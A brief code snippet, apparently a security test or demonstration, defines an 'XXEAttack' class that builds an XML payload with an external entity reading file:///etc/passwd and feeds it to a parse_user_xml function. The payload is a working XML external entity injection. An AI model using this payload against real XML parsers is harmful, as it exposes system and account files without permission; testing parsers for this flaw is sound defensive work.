class XXEAttack {
    function attack_xxe() {
        let malicious_xml = "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><user><username>&xxe;</username></user>"
        parse_user_xml(malicious_xml)
    }
}

